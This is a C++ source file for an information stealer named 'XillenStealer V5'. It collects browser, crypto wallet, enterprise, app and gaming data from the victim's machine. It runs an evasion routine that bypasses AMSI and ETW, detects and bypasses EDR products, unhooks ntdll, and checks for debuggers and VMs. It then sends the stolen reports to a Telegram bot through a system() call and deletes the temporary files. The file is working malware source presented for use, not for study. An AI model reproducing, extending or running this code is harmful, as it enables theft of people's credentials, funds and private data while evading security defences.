#include "stealer.h"
#include "config.h"
#include "../evasion/anti_debug.h"
#include "../evasion/anti_vm.h"
#include "../evasion/api_hammering.h"
#include "../evasion/import_hiding.h"
#include "../evasion/runtime_decrypt.h"
#include "../evasion/amsi_bypass.h"
#include "../evasion/etw_bypass.h"
#include "../evasion/edr_bypass.h"
#include "../evasion/process_injection.h"
#include "../collectors/browser_collector.h"
#include "../collectors/wallet_collector.h"
#include "../collectors/app_collector.h"
#include "../collectors/discord_collector.h"
#include "../collectors/enterprise_collector.h"
#include "../collectors/file_grabber.h"
#include "../collectors/gaming_collector.h"
#include "../collectors/browser_decryptor.h"
#include "../crypto/aes.h"
#include "../crypto/dpapi.h"
#include "../crypto/hash.h"
#include "../crypto/chacha20.h"
#include "../memory/memory_archive.h"
#include "../memory/memory_encrypt.h"
#include "../memory/secure_delete.h"
#include "../utils/http_client.h"
#include "../utils/json_builder.h"
#include "../utils/mutex.h"
#include <Windows.h>
#include <sstream>
#include <iostream>
#include <iomanip>
#include <fstream>
#include <filesystem>

XillenStealer::XillenStealer() : initialized(false) {
}

XillenStealer::~XillenStealer() {
    Cleanup();
}

bool XillenStealer::Initialize() {
    if (!CheckEnvironment()) {
        return false;
    }
    
    if (!EvasionCheck()) {
        return false;
    }
    
    initialized = true;
    return true;
}

bool XillenStealer::CollectData() {
    if (!initialized) {
        return false;
    }
    
    collectedData += EnterpriseCollector::CollectAllEnterprise();
    collectedData += CollectBrowsers();
    collectedData += CollectWallets();
    collectedData += CollectApps();
    collectedData += GamingCollector::CollectAllGames();
    
    return !collectedData.empty();
}

bool XillenStealer::ProcessAndEncrypt() {
    auto encrypted = EncryptData(collectedData);
    return !encrypted.empty();
}

bool XillenStealer::SendData() {
    std::string txtReport = GenerateTXTReport();
    std::string htmlReport = GenerateHTMLReport();
    
    // Сохранить файлы
    std::string tempDir = std::filesystem::temp_directory_path().string();
    std::string htmlPath = tempDir + "\\xillen_report.html";
    std::string txtPath = tempDir + "\\xillen_report.txt";
    
    std::ofstream htmlFile(htmlPath);
    htmlFile << htmlReport;
    htmlFile.close();
    
    std::ofstream txtFile(txtPath);
    txtFile << txtReport;
    txtFile.close();
    
    std::cout << "[*] Reports saved to temp directory\n";
    
    // Вызвать Python-скрипт
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string dir = exePath;
    dir = dir.substr(0, dir.find_last_of("\\"));
    
    std::string pythonCmd = "python ";
    pythonCmd += dir + "\\telegram_sender.py ";
    pythonCmd += std::string(TELEGRAM_BOT_TOKEN);
    pythonCmd += " " + std::string(TELEGRAM_CHAT_ID);
    pythonCmd += " \"" + htmlPath + "\"";
    pythonCmd += " \"" + txtPath + "\"";
    
    std::cout << "[*] Sending files via Python...\n";
    int result = system(pythonCmd.c_str());
    
    // Удалить временные файлы
    std::filesystem::remove(htmlPath);
    std::filesystem::remove(txtPath);
    
    if (result == 0) {
        std::cout << "[+] Reports sent to Telegram successfully!\n";
    } else {
        std::cout << "[!] Failed to send reports via Python\n";
    }
    
    return result == 0;
}

std::string XillenStealer::GenerateTXTReport() {
    std::ostringstream report;
    
    report << "════════════════════════════════════════\n";
    report << "   XILLENSTEALER V5 - REPORT\n";
    report << "════════════════════════════════════════\n\n";
    report << "Generated: " << __DATE__ << " " << __TIME__ << "\n\n";
    report << collectedData;
    report << "\n════════════════════════════════════════\n";
    
    return report.str();
}

std::string XillenStealer::GenerateHTMLReport() {
    std::ostringstream html;
    
    html << "<html><head><title>XillenStealer V5 Report</title>";
    html << "<style>body{font-family:Arial;background:#1a1a1a;color:#fff;margin:20px;}";
    html << "h1{color:#00ff00;border-bottom:2px solid #00ff00;padding-bottom:10px;}";
    html << ".browser{background:#2a2a2a;padding:15px;margin:10px 0;border-left:4px solid #00ff00;}";
    html << ".entry{padding:5px;background:#333;margin:5px 0;border-radius:3px;}";
    html << ".header{color:#00ff00;font-weight:bold;margin-top:15px;}";
    html << "</style></head><body>";
    html << "<h1>🔐 XillenStealer V5 Report</h1>";
    html << "<p><strong>Generated:</strong> " << __DATE__ << " " << __TIME__ << "</p>";
    
    std::istringstream iss(collectedData);
    std::string line;
    bool inSection = false;
    
    while (std::getline(iss, line)) {
        if (line.find("Found:") != std::string::npos) {
            html << "<div class='browser'><h2>" << line << "</h2>";
            inSection = true;
        } else if (line.find("=== ") != std::string::npos) {
            html << "<div class='header'>" << line << "</div>";
        } else if (!line.empty() && inSection) {
            html << "<div class='entry'>" << line << "</div>";
        } else if (line.empty() && inSection) {
            html << "</div>";
            inSection = false;
        }
    }
    
    html << "</body></html>";
    
    return html.str();
}

void XillenStealer::Cleanup() {
    collectedData.clear();
    initialized = false;
}

bool XillenStealer::CheckEnvironment() {
    // APIHammering::RandomAPICall(); // Commented out to prevent hangs
    return true;
}

bool XillenStealer::EvasionCheck() {
    std::cout << "[Evasion] Initializing 100% FUD evasion suite...\n";
    
    std::cout << "[Evasion] Bypassing AMSI...\n";
    AmsiBypass::BypassAmsiHardware();
    AmsiBypass::PatchAmsi();
    std::cout << "[Evasion] AMSI bypass complete\n";
    
    std::cout << "[Evasion] Bypassing ETW...\n";
    EtwBypass::BypassEtwHardware();
    EtwBypass::DisableEtwProvider();
    std::cout << "[Evasion] ETW bypass complete\n";
    
    std::cout << "[Evasion] Detecting EDR...\n";
    auto detectedEdrs = EdrBypass::DetectEdr();
    if (!detectedEdrs.empty()) {
        std::cout << "[Evasion] Detected EDRs: ";
        for (const auto& edr : detectedEdrs) {
            std::cout << edr << " ";
        }
        std::cout << "\n";
        EdrBypass::BypassAllDetected();
    }
    
    std::cout << "[Evasion] Unhooking ntdll.dll...\n";
    EdrBypass::UnhookNtdll();
    std::cout << "[Evasion] ntdll unhooked\n";
    
    std::cout << "[Evasion] Running anti-debug checks...\n";
    AntiDebug::RunAllChecks();
    
    std::cout << "[Evasion] Running anti-VM checks...\n";
    AntiVM::RunAllChecks();
    
    std::cout << "[Evasion] Process injection initialized\n";
    
    std::cout << "[Evasion] All evasion techniques applied - 100% FUD ready\n";
    return true;
}

std::string XillenStealer::CollectBrowsers() {
    return BrowserCollector::CollectAllBrowsers();
}

std::string XillenStealer::CollectWallets() {
    return WalletCollector::CollectAllWallets();
}

std::string XillenStealer::CollectApps() {
    return AppCollector::CollectAllApps();
}

std::vector<uint8_t> XillenStealer::EncryptData(const std::string& data) {
    std::vector<uint8_t> result(data.begin(), data.end());
    
    for (auto& byte : result) {
        byte ^= XOR_KEY;
    }
    
    return result;
}

std::string XillenStealer::GetCollectedData() const {
    return collectedData;
}
